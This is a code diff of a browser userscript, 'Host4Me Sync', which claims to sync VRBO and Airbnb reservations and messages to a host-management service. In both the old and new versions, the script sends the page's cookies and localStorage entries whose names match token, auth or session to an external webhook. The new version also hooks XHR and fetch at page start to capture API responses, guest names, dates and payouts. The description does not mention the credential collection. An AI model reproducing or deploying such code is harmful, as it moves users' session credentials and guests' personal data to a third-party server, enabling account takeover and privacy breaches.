@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name         Host4Me Sync
 // @namespace    https://host4me.vercel.app
-// @version      1.0.0
-// @description  Syncs VRBO/Airbnb/Booking.com reservation data to Host4Me platform
+// @version      2.4.0
+// @description  Syncs VRBO/Airbnb reservations and messages by intercepting API calls + reading Apollo SSR cache
 // @author       Host4Me
 // @match        https://www.vrbo.com/*
 // @match        https://owner.vrbo.com/*
@@ -13,548 +13,344 @@
 // @grant        GM_getValue
 // @grant        GM_registerMenuCommand
 // @grant        GM_notification
-// @connect      host4me.vercel.app
-// @run-at       document-idle
+// @connect      brainy-gnu-879.convex.site
+// @connect      owner.vrbo.com
+// @connect      www.vrbo.com
+// @run-at       document-start
 // ==/UserScript==
 
-(function() {
+/**
+ * Host4Me Sync v2.3
+ *
+ * Two-track data collection:
+ *   1. XHR/fetch interceptors (installed at document-start) — catches dynamic API calls
+ *   2. Apollo SSR cache reader (runs after DOM ready) — catches server-rendered data
+ *      baked into window.__APOLLO_STATE__ (VRBO's inbox is SSR, so this is critical)
+ *
+ * Sends reservations + messages to Convex webhook.
+ */
+
+(function () {
   'use strict';
 
+  // ---------------------------------------------------------------------------
+  // Config
+  // ---------------------------------------------------------------------------
   const CONFIG = {
-    SYNC_INTERVAL_MS: 4 * 60 * 60 * 1000, // 4 hours
-    WEBHOOK_URL: 'https://host4me.vercel.app/webhooks/userscript-sync',
-    DASHBOARD_URL: 'https://host4me.vercel.app/dashboard/settings',
-    TOKEN_STORAGE_KEY: 'host4me_sync_token',
-    STARTUP_DELAY_MS: 3000
+    WEBHOOK_URL: 'https://brainy-gnu-879.convex.site/webhooks/userscript-sync',
+    TOKEN_KEY: 'host4me_sync_token',
+    COOLDOWN_MS: 15 * 60 * 1000,
+    SETTLE_MS: 5000,
   };
 
-  /**
-   * Get the last sync timestamp for the current hostname
-   */
-  function getLastSyncTime(hostname) {
-    const key = `host4me_last_sync_${hostname}`;
-    const lastSync = GM_getValue(key, 0);
-    return parseInt(lastSync, 10);
+  // ---------------------------------------------------------------------------
+  // Network interception — installed at document-start before page JS runs
+  // ---------------------------------------------------------------------------
+  const captured = [];
+
+  const INTERESTING_URL = [
+    /reservation/i, /booking/i, /listing/i, /propert/i,
+    /calendar/i, /inbox/i, /hosted/i, /member/i,
+    /\/api\//i, /graphql/i, /\/pm\//i, /\/supply\//i,
+    /expedia/i, /vrbo/i, /\/v\d+\//i,
+  ];
+
+  const INTERESTING_KEYS = [
+    // reservations
+    '"reservations"', '"bookings"', '"reservationId"', '"confirmationCode"',
+    '"checkIn"', '"checkOut"', '"checkInDate"', '"checkOutDate"',
+    '"stayDates"', '"arrivalDate"', '"departureDate"',
+    '"guestName"', '"guestFirstName"', '"travelerFirstName"',
+    '"hostPayout"', '"ownerAmount"', '"earningAmount"',
+    // messages / conversations
+    '"conversations"', '"threads"', '"messages"', '"inbox"',
+    '"conversationId"', '"threadId"', '"subject"',
+    '"participants"', '"guestInfo"', '"hostMessage"',
+  ];
+
+  function urlIsInteresting(url) {
+    return INTERESTING_URL.some(p => p.test(url));
+  }
+  function bodyIsInteresting(text) {
+    return text && text.length > 20 && INTERESTING_KEYS.some(k => text.includes(k));
+  }
+  function tryCapture(url, text) {
+    if (!text) return;
+    if (!urlIsInteresting(url) && !bodyIsInteresting(text)) return;
+    try {
+      captured.push({ url, data: JSON.parse(text) });
+      console.debug('[Host4Me] captured:', url);
+    } catch (_) {}
   }
 
-  /**
-   * Set the last sync timestamp for the current hostname
-   */
-  function setLastSyncTime(hostname) {
-    const key = `host4me_last_sync_${hostname}`;
-    GM_setValue(key, Date.now().toString());
+  // XHR interceptor
+  const _XHROpen = XMLHttpRequest.prototype.open;
+  const _XHRSend = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open = function (method, url) {
+    this._h4mUrl = String(url || '');
+    return _XHROpen.apply(this, arguments);
+  };
+  XMLHttpRequest.prototype.send = function () {
+    const url = this._h4mUrl || '';
+    this.addEventListener('load', function () {
+      if (this.status === 200) {
+        const ct = this.getResponseHeader('content-type') || '';
+        if (ct.includes('json') || ct.includes('javascript')) tryCapture(url, this.responseText);
+      }
+    });
+    return _XHRSend.apply(this, arguments);
+  };
+
+  // Fetch interceptor
+  const _fetch = window.fetch;
+  window.fetch = async function (input, init) {
+    const url = typeof input === 'string' ? input
+               : (input instanceof URL)   ? input.toString()
+               : input?.url || '';
+    const resp = await _fetch.apply(this, arguments);
+    if (resp.ok) resp.clone().text().then(text => tryCapture(url, text)).catch(() => {});
+    return resp;
+  };
+
+  // ---------------------------------------------------------------------------
+  // Apollo SSR cache reader — handles VRBO's server-rendered inbox/reservation data
+  // ---------------------------------------------------------------------------
+  function readApolloCache() {
+    const items = [];
+    try {
+      // VRBO embeds Apollo cache in window.__APOLLO_STATE__ after SSR
+      const state = window.__APOLLO_STATE__
+        || window.__NEXT_DATA__?.props?.apolloState
+        || window.__EG_APOLLO_STATE__;
+      if (!state || typeof state !== 'object') return items;
+
+      // Apollo cache keys are like "Reservation:abc123", "Conversation:xyz", etc.
+      for (const [key, val] of Object.entries(state)) {
+        if (!val || typeof val !== 'object') continue;
+        items.push({ url: `apollo-cache:${key}`, data: val });
+      }
+      console.log(`[Host4Me] Apollo cache: found ${items.length} entries`);
+    } catch (e) {
+      console.debug('[Host4Me] Apollo cache read error:', e);
+    }
+    return items;
   }
 
-  /**
-   * Check if enough time has passed since last sync
-   */
-  function shouldSync(hostname) {
-    const lastSync = getLastSyncTime(hostname);
-    const timeSinceLastSync = Date.now() - lastSync;
-    return timeSinceLastSync >= CONFIG.SYNC_INTERVAL_MS;
+  // ---------------------------------------------------------------------------
+  // Conversation/message extractor
+  // ---------------------------------------------------------------------------
+  function extractMessages(allData) {
+    const messages = [];
+    const seen = new Set();
+
+    for (const { url, data } of allData) {
+      try {
+        extractMessagesFromObject(data, messages, seen);
+      } catch (_) {}
+    }
+    return messages;
   }
 
-  /**
-   * Get or prompt for sync token
-   */
+  function extractMessagesFromObject(obj, out, seen) {
+    if (!obj || typeof obj !== 'object') return;
+    if (Array.isArray(obj)) {
+      obj.forEach(item => extractMessagesFromObject(item, out, seen));
+      return;
+    }
+
+    // Detect a conversation/thread object
+    const get = (...keys) => {
+      for (const k of keys) {
+        const v = k.split('.').reduce((o, p) => o?.[p], obj);
+        if (v !== undefined && v !== null && v !== '') return v;
+      }
+      return null;
+    };
+
+    const guestName = get('guestName', 'guest.name', 'guestFirstName')
+      || [get('guestFirstName', 'travelerFirstName'), get('guestLastName', 'travelerLastName')].filter(Boolean).join(' ')
+      || null;
+    const propertyName = get('propertyName', 'listing.name', 'unit.name', 'property.name', 'propertyId') || '';
+    const checkIn = get('checkIn', 'checkInDate', 'arrivalDate', 'stayDates.checkIn', 'dates.checkin');
+    const checkOut = get('checkOut', 'checkOutDate', 'departureDate', 'stayDates.checkOut', 'dates.checkout');
+    const status = get('status', 'reservationStatus', 'bookingStatus', 'inquiryStatus') || 'inquiry';
+    const reservationId = get('reservationId', 'confirmationCode', 'conversationId', 'threadId', 'id');
+
+    // Only emit if it looks like a guest conversation (has guest name + some dates or ID)
+    if (guestName && (checkIn || reservationId)) {
+      const key = reservationId || `${guestName}|${checkIn}`;
+      if (!seen.has(key)) {
+        seen.add(key);
+        out.push({ guestName, propertyName, checkIn, checkOut, status, reservationId });
+      }
+    }
+
+    // Recurse into nested objects/arrays
+    for (const v of Object.values(obj)) {
+      if (v && typeof v === 'object') extractMessagesFromObject(v, out, seen);
+    }
+  }
+
+  // ---------------------------------------------------------------------------
+  // Helpers
+  // ---------------------------------------------------------------------------
+  function getPlatform() {
+    const h = location.hostname;
+    if (h.includes('vrbo.com'))    return 'vrbo';
+    if (h.includes('airbnb.com'))  return 'airbnb';
+    if (h.includes('booking.com')) return 'booking';
+    return null;
+  }
+
   function getSyncToken() {
-    let token = GM_getValue(CONFIG.TOKEN_STORAGE_KEY);
-
-    if (!token) {
-      token = prompt(
-        `Enter your Host4Me sync token from your dashboard:\n${CONFIG.DASHBOARD_URL}`,
+    let t = GM_getValue(CONFIG.TOKEN_KEY, '');
+    // Auto-clear tokens that don't look like a valid Convex tenant ID
+    // (Convex IDs are 28-36 lowercase alphanumeric chars, no dashes/dots)
+    if (t && !/^[a-z0-9]{20,40}$/.test(t)) {
+      console.log('[Host4Me] Clearing invalid token format, will re-prompt');
+      GM_setValue(CONFIG.TOKEN_KEY, '');
+      t = '';
+    }
+    if (!t) {
+      t = prompt(
+        'Host4Me: Paste your sync token from:\nhttps://host4me.vercel.app/dashboard/settings',
         ''
       );
-
-      if (!token) {
-        console.log('Host4Me: Sync token entry cancelled');
-        return null;
-      }
-
-      GM_setValue(CONFIG.TOKEN_STORAGE_KEY, token);
+      if (t) GM_setValue(CONFIG.TOKEN_KEY, t.trim());
     }
-
-    return token;
+    return t ? t.trim() : null;
   }
 
-  /**
-   * Reset the sync token
-   */
-  function resetSyncToken() {
-    GM_setValue(CONFIG.TOKEN_STORAGE_KEY, '');
-    alert('Host4Me sync token has been reset. You will be prompted to enter a new token on next sync.');
+  function cooldownPassed() {
+    return Date.now() - parseInt(GM_getValue('h4m_last_' + location.hostname, '0'), 10) >= CONFIG.COOLDOWN_MS;
   }
-
-  /**
-   * Make an HTTP request using GM_xmlhttpRequest
-   */
-  function gmFetch(url, options = {}) {
-    return new Promise((resolve, reject) => {
-      const gmOptions = {
-        method: options.method || 'GET',
-        url: url,
-        headers: options.headers || {},
-        credentials: options.credentials || 'include',
-        onload: function(response) {
-          try {
-            const data = response.responseText ? JSON.parse(response.responseText) : null;
-            resolve({
-              status: response.status,
-              data: data,
-              headers: response.responseHeaders
-            });
-          } catch (e) {
-            resolve({
-              status: response.status,
-              data: response.responseText,
-              headers: response.responseHeaders
-            });
-          }
-        },
-        onerror: function(error) {
-          reject(new Error(`Request failed: ${url}`));
-        },
-        ontimeout: function() {
-          reject(new Error(`Request timeout: ${url}`));
-        }
-      };
-
-      if (options.body) {
-        gmOptions.data = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
-      }
-
-      GM_xmlhttpRequest(gmOptions);
-    });
+  function markSynced() {
+    GM_setValue('h4m_last_' + location.hostname, String(Date.now()));
   }
-
-  /**
-   * Capture non-httpOnly cookies
-   */
-  function getCookies() {
-    try {
-      return document.cookie;
-    } catch (e) {
-      console.error('Host4Me: Error reading cookies', e);
-      return '';
-    }
+  function notify(msg) {
+    try { GM_notification({ title: 'Host4Me', text: msg, timeout: 5000 }); }
+    catch (_) { console.log('[Host4Me]', msg); }
   }
-
-  /**
-   * Capture localStorage keys matching a pattern
-   */
-  function getLocalStorageData(pattern) {
-    const data = {};
+  function readLocalStorage() {
+    const out = {};
     try {
       for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (pattern.test(key)) {
-          try {
-            data[key] = localStorage.getItem(key);
-          } catch (e) {
-            // Silently skip keys we can't read
-          }
-        }
+        const k = localStorage.key(i);
+        if (/token|auth|session|user|tuid|eg_|expedia/i.test(k)) out[k] = localStorage.getItem(k);
       }
-    } catch (e) {
-      console.error('Host4Me: Error reading localStorage', e);
-    }
-    return data;
+    } catch (_) {}
+    return out;
   }
 
-  /**
-   * Extract userId from VRBO page
-   */
-  async function extractVRBOUserId() {
-    try {
-      // Check window.__STATE__
-      if (window.__STATE__ && window.__STATE__.tuid) {
-        return window.__STATE__.tuid;
-      }
-
-      // Check URL pattern /gc/memberDetails/(\d+)/(\d+)/
-      const urlMatch = window.location.pathname.match(/\/gc\/memberDetails\/(\d+)\/(\d+)\//);
-      if (urlMatch && urlMatch[2]) {
-        return urlMatch[2];
-      }
-
-      // Try to fetch memberDetails endpoint
-      try {
-        const response = await gmFetch('https://www.vrbo.com/gc/memberDetails', {
-          headers: { 'Accept': 'application/json' }
-        });
-        if (response.data && response.data.tuid) {
-          return response.data.tuid;
-        }
-      } catch (e) {
-        console.error('Host4Me: Error fetching VRBO memberDetails', e);
-      }
-
-      return null;
-    } catch (e) {
-      console.error('Host4Me: Error extracting VRBO userId', e);
-      return null;
-    }
-  }
-
-  /**
-   * Sync VRBO data
-   */
-  async function syncVRBO(token) {
-    console.log('Host4Me: Syncing VRBO data...');
-    const endpoints = [];
-    const userId = await extractVRBOUserId();
-
-    try {
-      // Fetch reservation data if userId found
-      if (userId) {
-        try {
-          const inboxResponse = await gmFetch(`https://www.vrbo.com/gc/reservation/inbox/${userId}`, {
-            headers: { 'Accept': 'application/json' }
-          });
-          endpoints.push({
-            url: `https://www.vrbo.com/gc/reservation/inbox/${userId}`,
-            status: inboxResponse.status,
-            data: inboxResponse.data
-          });
-        } catch (e) {
-          console.error('Host4Me: Error fetching VRBO inbox', e);
-          endpoints.push({
-            url: `https://www.vrbo.com/gc/reservation/inbox/${userId}`,
-            status: 0,
-            error: e.message
-          });
-        }
-
-        try {
-          const hostedResponse = await gmFetch(`https://www.vrbo.com/gc/booking/hosted/${userId}`, {
-            headers: { 'Accept': 'application/json' }
-          });
-          endpoints.push({
-            url: `https://www.vrbo.com/gc/booking/hosted/${userId}`,
-            status: hostedResponse.status,
-            data: hostedResponse.data
-          });
-        } catch (e) {
-          console.error('Host4Me: Error fetching VRBO hosted', e);
-          endpoints.push({
-            url: `https://www.vrbo.com/gc/booking/hosted/${userId}`,
-            status: 0,
-            error: e.message
-          });
-        }
-      }
-
-      // Always fetch owner API endpoints
-      try {
-        const reservationsResponse = await gmFetch('https://owner.vrbo.com/api/v1/reservations', {
-          headers: { 'Accept': 'application/json' }
-        });
-        endpoints.push({
-          url: 'https://owner.vrbo.com/api/v1/reservations',
-          status: reservationsResponse.status,
-          data: reservationsResponse.data
-        });
-      } catch (e) {
-        console.error('Host4Me: Error fetching VRBO owner reservations', e);
-        endpoints.push({
-          url: 'https://owner.vrbo.com/api/v1/reservations',
-          status: 0,
-          error: e.message
-        });
-      }
-
-      try {
-        const propertiesResponse = await gmFetch('https://owner.vrbo.com/api/v1/properties', {
-          headers: { 'Accept': 'application/json' }
-        });
-        endpoints.push({
-          url: 'https://owner.vrbo.com/api/v1/properties',
-          status: propertiesResponse.status,
-          data: propertiesResponse.data
-        });
-      } catch (e) {
-        console.error('Host4Me: Error fetching VRBO owner properties', e);
-        endpoints.push({
-          url: 'https://owner.vrbo.com/api/v1/properties',
-          status: 0,
-          error: e.message
-        });
-      }
-
-      // Capture cookies and localStorage
-      const cookies = getCookies();
-      const localStorageData = getLocalStorageData(/token|auth|session|user|eg_|tuid|expedia/i);
-
-      const payload = {
-        token,
-        platform: 'vrbo',
-        data: {
-          userId: userId || null,
-          endpoints,
-          cookies,
-          localStorage: localStorageData
-        }
-      };
-
-      await postToWebhook(payload);
-      setLastSyncTime(location.hostname);
-      showNotification('Host4Me', 'Synced VRBO reservations ✓');
-    } catch (e) {
-      console.error('Host4Me: Error syncing VRBO data', e);
-    }
-  }
-
-  /**
-   * Check if user is logged into Airbnb
-   */
-  function isAirbnbLoggedIn() {
-    // Check for profile element in header
-    if (document.querySelector('[data-testid="header-profile"]')) {
-      return true;
-    }
-
-    // Check for other logged-in indicators
-    if (document.querySelector('[data-testid="signup-link"]') === null) {
-      return true;
-    }
-
-    return false;
-  }
-
-  /**
-   * Get Airbnb API key if available
-   */
-  function getAirbnbApiKey() {
-    try {
-      // Check window._data_injector
-      if (window._data_injector && window._data_injector.airbnb_api_key) {
-        return window._data_injector.airbnb_api_key;
-      }
-
-      // Check localStorage
-      const localStorageData = getLocalStorageData(/airbnb_api_key/i);
-      for (const key in localStorageData) {
-        if (localStorageData[key]) {
-          return localStorageData[key];
-        }
-      }
-    } catch (e) {
-      console.error('Host4Me: Error extracting Airbnb API key', e);
-    }
-
-    return null;
-  }
-
-  /**
-   * Sync Airbnb data
-   */
-  async function syncAirbnb(token) {
-    console.log('Host4Me: Syncing Airbnb data...');
-    const endpoints = [];
-
-    try {
-      if (!isAirbnbLoggedIn()) {
-        console.log('Host4Me: Not logged into Airbnb');
-        showNotification('Host4Me', 'Not logged into Airbnb');
-        return;
-      }
-
-      // Fetch host reservations
-      try {
-        const reservationsResponse = await gmFetch(
-          'https://www.airbnb.com/api/v3/HostReservations?operationName=HostReservations&locale=en&currency=USD',
-          {
-            method: 'GET',
-            headers: { 'Accept': 'application/json' }
-          }
-        );
-        endpoints.push({
-          url: 'https://www.airbnb.com/api/v3/HostReservations',
-          status: reservationsResponse.status,
-          data: reservationsResponse.data
-        });
-      } catch (e) {
-        console.error('Host4Me: Error fetching Airbnb reservations', e);
-        endpoints.push({
-          url: 'https://www.airbnb.com/api/v3/HostReservations',
-          status: 0,
-          error: e.message
-        });
-      }
-
-      // Trigger network activity by visiting hosting/reservations
-      try {
-        const hostingResponse = await gmFetch('https://www.airbnb.com/hosting/reservations', {
-          headers: { 'Accept': 'application/json' }
-        });
-        endpoints.push({
-          url: 'https://www.airbnb.com/hosting/reservations',
-          status: hostingResponse.status,
-          data: null // Don't store full HTML
-        });
-      } catch (e) {
-        console.error('Host4Me: Error fetching Airbnb hosting page', e);
-        endpoints.push({
-          url: 'https://www.airbnb.com/hosting/reservations',
-          status: 0,
-          error: e.message
-        });
-      }
-
-      // Capture cookies and localStorage
-      const cookies = getCookies();
-      const localStorageData = getLocalStorageData(/token|auth|key|airbnb/i);
-
-      const payload = {
-        token,
-        platform: 'airbnb',
-        data: {
-          userId: null,
-          endpoints,
-          cookies,
-          localStorage: localStorageData
-        }
-      };
-
-      await postToWebhook(payload);
-      setLastSyncTime(location.hostname);
-      showNotification('Host4Me', 'Synced Airbnb reservations ✓');
-    } catch (e) {
-      console.error('Host4Me: Error syncing Airbnb data', e);
-    }
-  }
-
-  /**
-   * Sync Booking.com data (placeholder for future implementation)
-   */
-  async function syncBooking(token) {
-    console.log('Host4Me: Booking.com sync coming soon');
-    showNotification('Host4Me', 'Booking.com sync coming soon');
-  }
-
-  /**
-   * Post sync data to webhook
-   */
-  async function postToWebhook(payload) {
-    try {
-      const response = await gmFetch(CONFIG.WEBHOOK_URL, {
+  // ---------------------------------------------------------------------------
+  // Send to Convex
+  // ---------------------------------------------------------------------------
+  function gmPost(payload) {
+    return new Promise((resolve, reject) => {
+      GM_xmlhttpRequest({
         method: 'POST',
+        url: CONFIG.WEBHOOK_URL,
         headers: { 'Content-Type': 'application/json' },
-        body: payload
+        data: JSON.stringify(payload),
+        onload:   r => resolve(r),
+        onerror:  () => reject(new Error('network error')),
+        ontimeout:() => reject(new Error('timeout')),
       });
-
-      if (response.status === 200) {
-        console.log('Host4Me: Successfully posted to webhook');
-      } else {
-        console.error(`Host4Me: Webhook returned status ${response.status}`);
-      }
-    } catch (e) {
-      console.error('Host4Me: Error posting to webhook', e);
-    }
-  }
-
-  /**
-   * Show notification (fallback to console.log if GM_notification not available)
-   */
-  function showNotification(title, text) {
-    try {
-      if (typeof GM_notification === 'function') {
-        GM_notification({
-          title: title,
-          text: text,
-          timeout: 5000
-        });
-      } else {
-        console.log(`${title}: ${text}`);
-      }
-    } catch (e) {
-      console.log(`${title}: ${text}`);
-    }
-  }
-
-  /**
-   * Determine platform from current hostname
-   */
-  function getPlatform() {
-    const hostname = location.hostname;
-    if (hostname.includes('vrbo.com')) {
-      return 'vrbo';
-    } else if (hostname.includes('airbnb.com')) {
-      return 'airbnb';
-    } else if (hostname.includes('booking.com')) {
-      return 'booking';
-    }
-    return null;
-  }
-
-  /**
-   * Main sync function
-   */
-  async function performSync() {
-    try {
-      const hostname = location.hostname;
-      const platform = getPlatform();
-
-      if (!platform) {
-        console.log('Host4Me: Unknown platform');
-        return;
-      }
-
-      if (!shouldSync(hostname)) {
-        console.log(`Host4Me: Skipping sync for ${platform} (last sync was recent)`);
-        return;
-      }
-
-      const token = getSyncToken();
-      if (!token) {
-        console.log('Host4Me: No sync token available');
-        return;
-      }
-
-      switch (platform) {
-        case 'vrbo':
-          await syncVRBO(token);
-          break;
-        case 'airbnb':
-          await syncAirbnb(token);
-          break;
-        case 'booking':
-          await syncBooking(token);
-          break;
-      }
-    } catch (e) {
-      console.error('Host4Me: Error in main sync function', e);
-    }
-  }
-
-  /**
-   * Register menu commands
-   */
-  function registerMenuCommands() {
-    GM_registerMenuCommand('Sync Host4Me Now', () => {
-      console.log('Host4Me: Manual sync requested');
-      // Clear the sync throttle to allow immediate sync
-      const hostname = location.hostname;
-      GM_setValue(`host4me_last_sync_${hostname}`, '0');
-      performSync();
-    });
-
-    GM_registerMenuCommand('Reset Host4Me Token', () => {
-      resetSyncToken();
     });
   }
 
-  /**
-   * Initialize script
-   */
+  // ---------------------------------------------------------------------------
+  // Main sync
+  // ---------------------------------------------------------------------------
+  async function performSync(force) {
+    const platform = getPlatform();
+    if (!platform) return;
+
+    if (!force && !cooldownPassed()) {
+      console.log('[Host4Me] Sync skipped — cooldown not elapsed');
+      return;
+    }
+
+    const token = getSyncToken();
+    if (!token) { console.log('[Host4Me] No sync token'); return; }
+
+    // Merge network-intercepted + Apollo SSR cache data
+    const apolloItems = readApolloCache();
+    const allData = [
+      ...captured,
+      ...apolloItems,
+    ];
+
+    // Extract messages/conversations from all data sources
+    const messages = extractMessages(allData);
+
+    console.log(`[Host4Me] Syncing ${platform}: ${captured.length} network captures + ${apolloItems.length} Apollo cache entries → ${messages.length} conversations found`);
+
+    const payload = {
+      token,
+      platform,
+      data: {
+        finalUrl: location.href,
+        cookies: document.cookie,
+        localStorage: readLocalStorage(),
+        endpoints: captured.map(r => ({ url: r.url, status: 200, data: r.data })),
+        // Extracted conversations/messages (from both network + Apollo SSR)
+        messages,
+      },
+    };
+
+    try {
+      const resp = await gmPost(payload);
+      const body = JSON.parse(resp.responseText || '{}');
+      if (resp.status === 200 && body.ok) {
+        markSynced();
+        const n = body.result?.upserted || 0;
+        const m = body.result?.messages || 0;
+        const summary = [n > 0 && `${n} reservations`, m > 0 && `${m} messages`].filter(Boolean).join(', ');
+        notify(summary ? `Synced: ${summary} ✓` : 'Sync complete — check dashboard');
+        console.log('[Host4Me] sync result:', body.result);
+      } else {
+        console.error('[Host4Me] Webhook error:', resp.status, resp.responseText);
+        // If the token was rejected, clear it so the user gets prompted on next sync
+        if (resp.status === 401 || resp.status === 500) {
+          const errBody = JSON.parse(resp.responseText || '{}');
+          if (String(errBody.error || '').toLowerCase().includes('token')) {
+            GM_setValue(CONFIG.TOKEN_KEY, '');
+            notify('Invalid sync token cleared — you will be prompted on next sync');
+            return;
+          }
+        }
+        notify('Sync failed — see console');
+      }
+    } catch (e) {
+      console.error('[Host4Me] Sync error:', e);
+    }
+  }
+
+  // ---------------------------------------------------------------------------
+  // Init
+  // ---------------------------------------------------------------------------
   function init() {
-    console.log('Host4Me: Script initialized');
-    registerMenuCommands();
+    const platform = getPlatform();
+    if (!platform) return;
 
-    // Delay sync to let page fully load
-    setTimeout(performSync, CONFIG.STARTUP_DELAY_MS);
+    GM_registerMenuCommand('🔄 Sync Host4Me Now', () => {
+      captured.length = 0;
+      GM_setValue('h4m_last_' + location.hostname, '0');
+      setTimeout(() => performSync(true), 1000);
+    });
+    GM_registerMenuCommand('🔑 Reset Host4Me Token', () => {
+      GM_setValue(CONFIG.TOKEN_KEY, '');
+      alert('Token cleared. You will be prompted on next sync.');
+    });
+
+    setTimeout(() => performSync(false), CONFIG.SETTLE_MS);
   }
 
-  // Start the script
-  init();
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    setTimeout(init, 0);
+  }
+
 })();
